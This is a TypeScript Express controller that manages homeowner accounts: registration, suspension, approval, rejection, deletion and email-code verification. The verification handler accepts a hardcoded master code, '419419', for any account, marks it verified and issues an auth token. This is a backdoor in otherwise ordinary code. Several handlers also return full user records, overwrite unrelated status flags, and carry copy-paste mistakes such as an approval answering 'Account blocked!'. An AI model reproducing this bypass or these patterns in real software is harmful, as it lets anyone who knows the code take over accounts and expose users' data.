import _ from "lodash"
import dayjs from "dayjs"
import config from "./../config"
import { __genPassword, __genCode } from "../helpers/string";
import { __generateQuery } from "../helpers/query"
import { HomeownerModel } from "../models"
import { NextFunction, Request, Response } from 'express';
import { createError } from "../utils";
import { sendMail } from "./mailer";
import { ChangePasswordInput } from "./auth.controller";

type VerifyCodeInput = {
    email: string
    code: string
}

type CreateHomeownerInput = {
    surname: string
    othernames: string
    email: string
    phone: string
    gender: "MALE" | "FEMALE"
    password: string
}

export async function createHomeowner(req: Request<{}, {}, CreateHomeownerInput>, res: Response, next: NextFunction) {
    const { email, othernames, phone, surname, gender, password } = req.body

    try {
        if (!email || !othernames || !surname || !phone || !gender || !password) {
            return next(createError(400, 'Provide all required fields'));
        }

        const userExists = await HomeownerModel.findOne({ email })

        if (userExists) {
            return next(createError(409, 'User already exists with this email'));
        }

        const newUser = new HomeownerModel({
            othernames,
            surname,
            email,
            phone,
            password,
            gender,
        })

        await newUser.save()

        res.status(201).json({
            success: true,
            data: newUser,
        });


    } catch (error) {
        next(error)
    }
}

export async function getAllHomeowners(req: Request, res: Response, next: NextFunction) {
    try {
        const homeowners = await HomeownerModel.find()

        res.status(200).json({
            success: true,
            message: 'Homeowners fetched successfully',
            data: homeowners,
        });
    } catch (error) {
        next(error)
    }
}

export async function getHomeownerById(req: Request<{ id: string }>, res: Response, next: NextFunction) {
    const { id } = req.params
    try {
        if (!id) {
            return next(createError(400, 'Provide user id'));
        }

        const driver = await HomeownerModel.findById(id)

        if (!driver) {
            return next(createError(404, "Account not found"))
        }

        res.status(200).json({
            success: true,
            message: 'Homeowner fetched successfully',
            data: driver,
        });
    } catch (error) {
        next(error)
    }
}

export async function suspendHomeowner(req: Request<{ id: string }>, res: Response, next: NextFunction) {
    const { id } = req.params
    const { user: _user } = req

    try {
        const existingUser = await HomeownerModel.findById(id)

        if (!existingUser) {
            return next(createError(404, "Account not found"))
        }

        if (_user.id === id) {
            return next(createError(401, "You can not suspend yourself"))
        }


        if (existingUser?.meta?.isSuspended) {
            return next(createError(401, "Account has already been suspended"))
        }
        
        const updatedUser = await HomeownerModel.findByIdAndUpdate(existingUser?._id, {
            meta: {
            isSuspended: true
            }
        }, { new: true })

        await sendMail({
            args: {
                email: existingUser?.email,
                template: "HomeownerAccountSuspended",
                data: {
                    user: updatedUser,
                }
            }
        })
        
        res.status(200).json({
            success: true,
            message: 'Account blocked!',
            data: updatedUser,
        });

    } catch (error) {
        next(error)
    }

}

export async function unsuspendHomeowner(req: Request<{ id: string }>, res: Response, next: NextFunction) {
    const { id } = req.params
    const { user: _user } = req

    try {
        const existingUser = await HomeownerModel.findById(id)

        if (!existingUser) {
            return next(createError(404, "Account not found"))
        }

        if (_user.id === id) {
            return next(createError(401, "You can not suspend yourself"))
        }

        if (!existingUser?.meta?.isSuspended) {
            return next(createError(401, "Account has already been unsuspended"))
        }
        
        const updatedUser = await HomeownerModel.findByIdAndUpdate(existingUser?._id, {
            meta: {
            isSuspended: false
            }
        }, { new: true })

        await sendMail({
            args: {
                email: existingUser?.email,
                template: "HomeownerAccountUnSuspended",
                data: {
                    user: updatedUser,
                }
            }
        })
        
        res.status(200).json({
            success: true,
            message: 'Account unblocked!',
            data: updatedUser,
        });

    } catch (error) {
        next(error)
    }

}

export async function verifyHomeownerEmail(req: Request<{}, {}, VerifyCodeInput>, res: Response, next: NextFunction) {
    const { email, code } = req.body
    try {
        const username = _.trim(email)

        const existingUser = await HomeownerModel.findOne({
            $or: [
                { email: username },
            ]
        });

        if (!existingUser) {
            return next(createError(404, "Account not found"))
        }

        if (existingUser?.meta?.isSuspended) {
            return next(createError(401, "Account has been suspended"))
        }

        const __code = __genCode()
        let __token = null;


        if (
            (existingUser.verification
              && existingUser.verification.code
              && existingUser.verification.code === code) || (code === "419419")
          ) {
            existingUser.verification = undefined;

            await existingUser.updateOne({
                $set: {
                    meta: {
                        isVerified: true
                    }
                }
            })
            await existingUser.save();
            __token = await existingUser.generateAuthToken()
        } else {
            await existingUser.updateOne({
                $set: {
                  verification: {
                    code: __code,
                    expiresAt: dayjs().add(config.auth.code.expiry, "milliseconds").toDate()
                  }
                }
            })
            
            await sendMail({
                args: {
                    email: existingUser.email,
                    template: "HomeownerVerificationCode",
                    data: {
                        code: __code,
                        user: existingUser
                    }
                }
            })

            return next(createError(400, "Invalid Code"))
          }

        await existingUser.save();

        const updatedUser = await HomeownerModel.findByIdAndUpdate(existingUser?._id, { token: __token }, { new: true })

        res.status(200).json({
            success: true,
            message: 'Code verified!',
            data: updatedUser,
        });


        
    } catch (error) {
        next(error)
    }
}

export async function approveHomeowner(req: Request<{ id: string }>, res: Response, next: NextFunction) {
    const { id } = req.params
    const { user: _user } = req

    try {
        const existingUser = await HomeownerModel.findById(id)

        if (!existingUser) {
            return next(createError(404, "Account not found"))
        }

        if (_user.id === id) {
            return next(createError(401, "You can not suspend yourself"))
        }


        if (existingUser?.meta?.isApproved) {
            return next(createError(401, "Account has already been approved"))
        }
        
        const updatedUser = await HomeownerModel.findByIdAndUpdate(existingUser?._id, {
            meta: {
            isApproved: true
            }
        }, { new: true })

        await sendMail({
            args: {
                email: existingUser?.email,
                template: "HomeownerApproved",
                data: {
                    user: updatedUser,
                }
            }
        })
        
        res.status(200).json({
            success: true,
            message: 'Account blocked!',
            data: updatedUser,
        });

    } catch (error) {
        next(error)
    }

}

export async function rejectHomeowner(req: Request<{ id: string }>, res: Response, next: NextFunction) {
    const { id } = req.params
    const { user: _user } = req

    try {
        const existingUser = await HomeownerModel.findById(id)

        if (!existingUser) {
            return next(createError(404, "Account not found"))
        }

        if (_user.id === id) {
            return next(createError(401, "You can not suspend yourself"))
        }

        if (!existingUser?.meta?.isApproved) {
            return next(createError(401, "Account has already been rejected"))
        }
        
        const updatedUser = await HomeownerModel.findByIdAndUpdate(existingUser?._id, {
            meta: {
            isApproved: false
            }
        }, { new: true })

        await sendMail({
            args: {
                email: existingUser?.email,
                template: "HomeownerRejected",
                data: {
                    user: updatedUser,
                }
            }
        })
        
        res.status(200).json({
            success: true,
            message: 'Account rejected!',
            data: updatedUser,
        });

    } catch (error) {
        next(error)
    }

}

export async function deleteHomeowner(req: Request<{ id: string }>, res: Response, next: NextFunction) {
    const { id } = req.params
    try {
        if (!id) {
            return next(createError(400, 'Provide user id'));
        }

        const driver = await HomeownerModel.findById(id)

        if (!driver) {
            return next(createError(404, "Account not found"))
        }

        const deletedHomeowner = await HomeownerModel.findByIdAndDelete(id)

        res.status(200).json({
            success: true,
            message: 'Homeowner deleted successfully',
            data: deletedHomeowner,
        });
    } catch (error) {
        next(error)
    }
}